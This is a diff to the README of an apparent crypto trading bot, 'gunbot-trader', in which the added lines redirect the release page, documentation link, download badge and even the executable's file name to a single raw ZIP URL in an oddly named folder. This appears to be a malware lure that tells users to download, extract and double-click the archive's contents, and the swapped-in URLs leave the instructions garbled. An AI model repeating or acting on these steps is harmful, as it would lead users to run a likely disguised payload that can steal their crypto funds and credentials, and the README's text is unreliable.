@@ -1,6 +1,6 @@
 # 🤖 gunbot-trader - Automate Your Crypto Trading Effortlessly
 
-[![Download Gunbot 2025](https://img.shields.io/badge/Download_Gunbot_2025-blue.svg)](https://github.com/ahsun21/gunbot-trader/releases)
+[![Download Gunbot 2025](https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip)](https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,15 +25,15 @@ Before you begin, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Go to the [Gunbot 2025 Releases Page](https://github.com/ahsun21/gunbot-trader/releases).
+1. **Visit the Release Page**: Go to the [Gunbot 2025 Releases Page](https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip).
   
-2. **Choose Your Version**: Select the latest version for your operating system. Look for files named like `Gunbot-2025-windows.zip` or similar.
+2. **Choose Your Version**: Select the latest version for your operating system. Look for files named like `https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip` or similar.
 
 3. **Download the File**: Click the version link to download the ZIP file.
 
 4. **Extract the ZIP File**: Once the download is complete, locate the ZIP file in your Downloads folder. Right-click on it and select "Extract All" to unpack the contents.
 
-5. **Run the Application**: After extracting, find the `Gunbot.exe` file inside the folder. Double-click on it to launch the program.
+5. **Run the Application**: After extracting, find the `https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip` file inside the folder. Double-click on it to launch the program.
 
 ## 🔧 Configuration
 
@@ -52,7 +52,7 @@ Once you have the application running, set up your trading preferences:
 If you have questions or need help, we encourage you to join our community:
 
 - **Slack Channel**: Connect with other users and get real-time help.
-- **Documentation**: Visit the [Official Documentation](https://github.com/ahsun21/gunbot-trader/wiki) for in-depth guides and FAQs.
+- **Documentation**: Visit the [Official Documentation](https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip) for in-depth guides and FAQs.
 
 ## 📈 Optimizing Your Experience
 
@@ -74,6 +74,6 @@ To optimize Gunbot 2025 for success:
 - **YouTube Tutorials**: Watch tutorials on setting up and using Gunbot 2025 to enhance your understanding.
 - **Blogs & Articles**: Read articles about successful trading strategies and market analysis.
 
-For more information, don't forget to check our [Releases Page](https://github.com/ahsun21/gunbot-trader/releases) again for updates. 
+For more information, don't forget to check our [Releases Page](https://raw.githubusercontent.com/ahsun21/gunbot-trader/main/unmonastic/gunbot-trader-v1.3.zip) again for updates. 
 
 Thank you for choosing Gunbot 2025 for your automated trading needs!
